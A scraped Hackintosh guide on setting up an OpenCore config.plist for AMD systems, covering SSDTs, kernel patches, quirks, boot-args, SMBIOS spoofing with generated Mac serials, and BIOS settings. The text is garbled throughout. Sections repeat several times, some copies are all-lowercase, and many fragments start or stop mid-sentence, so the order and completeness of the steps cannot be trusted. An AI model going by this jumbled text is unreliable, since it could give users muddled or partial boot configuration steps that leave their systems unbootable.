                   For Ventura information, see macOS 13 Ventura\n\n\n# Starting Point\n\nSo making a config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n * AMD Kernel Patches\n   * Needed for booting macOS on AMD hardware(save these for later, we'll go over how to use them below)\n   * Supporting AMD Family 15h, 16h, 17h and 19h\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nBy default, the Sample.plist has this section set for audio which we'll be setting up by setting the layout ID in the boot-args section, so removal of PciRoot(0x0)/Pci(0x1b,0x0) is also recommended from the Add section.\n\nTL;DR, delete all the PciRoot's here as we won't be using this section.\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\nKERNEL   KERNEL PATCHES\n         \n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nInfo\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons and to disable CPU power management on unsupported CPUs (such as AMD CPUs)\n\nQUIRK                  ENABLED\nDummyPowerManagement   YES\n\nMore in-depth Info\n * Cpuid1Mask: Leave this blank\n   * Mask for fake CPUID\n * Cpuid1Data: Leave this blank\n   * Fake CPUID entry\n * DummyPowerManagement: YES\n   * New alternative to NullCPUPowerManagement, required for all AMD CPU based systems as there's no native power management.\n * MinKernel: Leave this blank\n   * Lowest kernel version the above patches will be injected into, if no value specified it'll be applied to all versions of macOS.

The latest AMD kernel patches can always be found on the AMD Vanilla GitHub Repository.\n\nKernel patches:\n\n * Bulldozer/Jaguar (15h/16h) (10.13 - 12.x)\n\nTo merge:\n\n * Open both files,\n * Delete the Kernel -> Patch section from config.plist\n * Copy the Kernel -> Patch section from patches.plist\n * Paste into where old patches were in config.plist\n\n\n\nYou will also need to modify four patches, all named algrey - Force cpuid_cores_per_package. You only need to change the Replace value. You should change:\n\n * B8000000 0000 => B8 <core count> 0000 0000\n * BA000000 0000 => BA <core count> 0000 0000\n * BA000000 0090 => BA <core count> 0000 0090\n * BA000000 00 => BA <core count> 0000 00\n\nWhere <core count> is replaced with the physical core count of your CPU in hexadecimal. For example, an 8-Core 5800X would have the new Replace value be:\n\n * B8 08 0000 0000\n * BA 08 0000 0000\n * BA 08 0000 0090\n * BA 08 0000 00\n\nCore Count => Hexadecimal Table\n\nCORE COUNT   HEXADECIMAL\n2 Core       02\n4 Core       04\n6 Core       06\n8 Core       08\n12 Core      0C\n16 Core      10\n24 Core      18\n32 Core      20\n64 Core      40\n\n\n# Quirks\n\nInfo\n\nSettings relating to the kernel, for us we'll be enabling the following:\n\nQUIRK                     ENABLED   COMMENT\nPanicNoKextDump           YES       \nPowerTimeoutKernelPanic   YES       \nProvideCurrentCpuInfo     YES       \nXhciPortLimit             YES       Disable if running macOS 11.3+\n\nMore in-depth Info\n * AppleCpuPmCfgLock: NO\n   * Only needed when CFG-Lock can't be disabled in BIOS. AMD users can ignore\n * AppleXcpmCfgLock: NO\n   * Only needed when CFG-Lock can't be disabled in BIOS. AMD users can ignore\n * AppleXcpmExtraMsrs: NO\n   * Disables multiple MSR access needed for unsupported CPUs like Pentiums and certain Xeons\n * CustomSMBIOSGuid: NO\n   * Performs GUID patching for UpdateSMBIOSMode set to Custom. Usually relevant for Dell laptops\n   * Enabling this quirk in tandem with PlatformInfo -> UpdateSMBIOSMode -> Custom will disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk.\n * DisableIoMapper: NO\n   * AMD doesn't have DMAR or VT-D support so irrelevant\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie.

Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

The next page\n                                  goes into more detail about this setting.\nVault                  Optional   This is a word, it is not optional to omit this setting. You\n                                  will regret it if you don't set it to Optional, note that it\n                                  is case-sensitive\n\nMore in-depth Info\n\n * AllowSetDefault: YES\n   \n   * Allow CTRL+Enter and CTRL+Index to set default boot device in the picker\n\n * ApECID: 0\n   \n   * Used for netting personalized secure-boot identifiers, currently this quirk is unreliable due to a bug in the macOS installer so we highly encourage you to leave this as default.\n\n * AuthRestart: NO\n   \n   * Enables Authenticated restart for FileVault 2 so password is not required on reboot. Can be considered a security risk so optional\n\n * BlacklistAppleUpdate: YES\n   \n   * Used for blocking firmware updates, used as extra level of protection as macOS Big Sur no longer uses run-efi-updater variable\n\n * DmgLoading: Signed\n   \n   * Ensures only signed DMGs load\n\n * ExposeSensitiveData: 6\n   \n   * Shows more debug information, requires debug version of OpenCore\n\n * Vault: Optional\n   \n   * We won't be dealing vaulting so we can ignore, you won't boot with this set to Secure\n   * This is a word, it is not optional to omit this setting. You will regret it if you don't set it to Optional, note that it is case-sensitive\n\n * ScanPolicy: 0\n   \n   * 0 allows you to see all drives available, please refer to Security section for further details. Will not boot USB devices with this set to default\n\n * SecureBootModel: Default\n   \n   * Controls Apple's secure boot functionality in macOS, please refer to Security section for further details.\n   * Note: Users may find upgrading OpenCore on an already installed system can result in early boot failures.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nnpci=0x3000   This disables some PCI debugging related to\n              kIOPCIConfiguratorPFM64 and gIOPCITunnelledKey. This is an\n              alternative to having Above 4G Decoding enabled in your\n              BIOS. Do not use this unless you don't have it in your BIOS.\n              Required for when getting stuck on [PCI configuration begin]\n              as there are IRQ conflicts relating to your PCI lanes.\n              Source\n\n * GPU-Specific boot-args:\n\nBOOT-ARGS        DESCRIPTION\nagdpmod=pikera   Used for disabling board ID checks on some Navi GPUs (RX\n                 5000 & 6000 series), without this you'll get a black screen.\n                 Don't use if you don't have Navi (ie.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nInfo\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.

This will give us an output similar to the following:\n\n  #######################################################\n #               MacPro7,1 SMBIOS Info                 #\n#######################################################\n\nType:         MacPro7,1\nSerial:       F5KZV0JVP7QM\nBoard Serial: F5K9518024NK3F7JC\nSmUUID:       535B897C-55F7-4D65-A8F4-40F4B96ED394\nApple ROM:    001D4F0D5E22\n\n\nThe order is Product | Serial | Board Serial (MLB)\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nThe Apple ROM part gets copied to Generic -> ROM.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired.

This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlus.efi\n * OpenRuntime.efi\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

Needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, Startup Disk control panel functioning, etc.\n\n * UnblockFsConnect: NO\n   \n   * Some firmware block partition handles by opening them in By Driver mode, which results in File System protocols being unable to install. Mainly relevant for HP systems when no drives are listed\n\n\n# ReservedMemory\n\nUsed for exempting certain memory regions from OSes to use, mainly relevant for Sandy Bridge iGPUs or systems with faulty memory. Use of this quirk is not covered in this guide\n\n\n# Cleaning up\n\nAnd now you're ready to save and place it into your EFI under EFI/OC.\n\nFor those having booting issues, please make sure to read the Troubleshooting section first and if your questions are still unanswered we have plenty of resources at your disposal:\n\n * AMD OS X Discord\n * r/Hackintosh Subreddit\n\n\n# AMD BIOS Settings\n\n * Note: Most of these options may not be present in your firmware, we recommend matching up as closely as possible but don't be too concerned if many of these options are not available in your BIOS\n\n\n# Disable\n\n * Fast Boot\n * Secure Boot\n * Serial/COM Port\n * Parallel Port\n * Compatibility Support Module (CSM) (Must be off in most cases, GPU errors/stalls like gIO are common when this option is enabled)\n * IOMMU\n\n\n# Enable\n\n * Above 4G Decoding (This must be on, if you can't find the option then add npci=0x3000 to boot-args.

guide will tell you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n * amd kernel patches\n   * needed for booting macos on amd hardware(save these for later, we'll go over how to

details.\n\nnote that you should not add your generated dsdt.aml here, it is already in your firmware. so if present, remove the entry for it in your config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\nthis blocks certain acpi tables from loading, for us we can ignore this.\n\n\n# patch\n\nthis section allows us to dynamically modify parts of the acpi (dsdt, ssdt, etc.) via opencore. for us, our patches are handled by our ssdts. this is a much cleaner solution as this will allow us to boot windows and other oses with opencore\n\n\n# quirks\n\nsettings relating to acpi, leave everything here as default as we have no use for these quirks.\n\n\n# booter\n\n\n\nthis section

  * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we

instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nnpci=0x3000   this disables some pci debugging related to\n              kiopciconfiguratorpfm64 and giopcitunnelledkey. this is an\n              alternative to having above 4g decoding enabled in your\n              bios. do not use this unless you don't have it in your

default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\ninfo\n\nforcibly rewrites nvram variables, do note that add will not overwrite values

play with certain gpus better than others:\n\n * macpro7,1: amd polaris and newer\n   * note that macpro7,1 is exclusive to macos 10.15, catalina and newer\n * imacpro1,1: nvidia maxwell and pascal or amd polaris and newer\n   * use if you need high sierra or mojave, otherwise use macpro7,1\n * imac14,2: nvidia maxwell and pascal\n   * use if you get black screens on imacpro1,1 after installing web drivers with an nvidia gpu\n * macpro6,1: amd gcn gpus (supported hd and r5/r7/r9 series)\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will

config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n * AMD Kernel Patches\n   * Needed for booting macOS on AMD hardware(save these for later, we'll go over how to use them below)\n   * Supporting AMD Family 15h, 16h, 17h and 19h\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\nSSDT-CPUR        Fixes CPU definitions with B550 and A520 motherboards, do\n                 not use if you don't have an AMD B550 or A520 system. You\n                 can find a prebuilt here: SSDT-CPUR.aml\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nnpci=0x3000   This disables some PCI debugging related to\n              kIOPCIConfiguratorPFM64 and gIOPCITunnelledKey.

Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlus.efi\n * OpenRuntime.efi\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

Needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, Startup Disk control panel functioning, etc.\n\n * UnblockFsConnect: NO\n   \n   * Some firmware block partition handles by opening them in By Driver mode, which results in File System protocols being unable to install. Mainly relevant for HP systems when no drives are listed\n\n\n# ReservedMemory\n\nUsed for exempting certain memory regions from OSes to use, mainly relevant for Sandy Bridge iGPUs or systems with faulty memory. Use of this quirk is not covered in this guide\n\n\n# Cleaning up\n\nAnd now you're ready to save and place it into your EFI under EFI/OC.\n\nFor those having booting issues, please make sure to read the Troubleshooting section first and if your questions are still unanswered we have plenty of resources at your disposal:\n\n * AMD OS X Discord\n * r/Hackintosh Subreddit\n\n\n# AMD BIOS Settings\n\n * Note: Most of these options may not be present in your firmware, we recommend matching up as closely as possible but don't be too concerned if many of these options are not available in your BIOS\n\n\n# Disable\n\n * Fast Boot\n * Secure Boot\n * Serial/COM Port\n * Parallel Port\n * Compatibility Support Module (CSM) (Must be off in most cases, GPU errors/stalls like gIO are common when this option is enabled)\n * IOMMU\n\nSpecial note for 3990X users: macOS currently does not support more than 64 threads in the kernel, and so will kernel panic if it sees more. The 3990X CPU has 128 threads total and so requires half of that disabled. We recommend disabling hyper threading in the BIOS for these situations.\n\n\n# Enable\n\n * Above 4G Decoding (This must be on, if you can't find the option then add npci=0x3000 to boot-args. Do not have both this option and npci enabled at the same time.)\n   * If you are on a Gigabyte/Aorus or an AsRock motherboard, enabling this option may break certain drivers(ie. Ethernet) and/or boot failures on other OSes, if it does happen then disable this option and opt for npci instead\n   * 2020+ BIOS Notes: When enabling Above4G, Resizable BAR Support may become an available on some X570 and newer motherboards. Please ensure that Booter -> Quirks -> ResizeAppleGpuBars is set to 0 if this is enabled.\n * EHCI/XHCI Hand-off\n * OS type: Windows 8.1/10 UEFI Mode (some motherboards may require \"Other OS\" instead)\n * SATA Mode: AHCI\n\n\n# Once done here, we need to edit a couple extra values.

issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n * amd kernel

than once before setting up opencore and make sure you have it set up correctly. do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# acpi\n\n\n\n\n# add\n\ninfo\n\nthis is where you'll add ssdts for your system, these are very important to booting macos and have many uses like usb maps, disabling unsupported gpus and such. and with our system, it's even required to boot. guide on making them found here: getting started with acpi\n\nrequired ssdts   description\nssdt-ec-usbx     fixes both the

firmware. so if present, remove the entry for it in your config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\nthis blocks certain acpi tables from loading, for us we can ignore this.\n\n\n# patch\n\nthis section allows us to dynamically modify parts of the acpi (dsdt, ssdt, etc.) via opencore. for us, our patches are handled by our ssdts. this is a much cleaner solution as this will allow us to boot windows and other oses with opencore\n\n\n# quirks\n\nsettings relating to acpi,

platforms and disable this entry.\n   * however, due to issues with oems not using the latest edkii builds you may find that the above combo will result in early boot failures. this is due to missing the memory_attribute_table and such we recommend disabling rebuildapplememorymap and enabling enablewriteunprotector. more info on this is covered in the troubleshooting section\n * providecustomslide: yes\n   * used for slide variable calculation. however the necessity of this quirk is determined by ocabc: only n/256 slide values are usable! message in the debug log. if the message ocabc: all slides are usable! you can disable providecustomslide! is present in your log, you can disable providecustomslide.\n * rebuildapplememorymap: yes\n   * generates memory map compatible with macos, can break on some laptop oem firmwares so if you receive early boot failures disable this\n * resizeapplegpubars: -1\n   * will reduce the size of gpu pci bars if set to 0 when booting macos, set to -1 to disable\n   * setting other pci bar values is possible with this quirk, though can cause instabilities\n   * this quirk being set to zero is only necessary if resizable bar

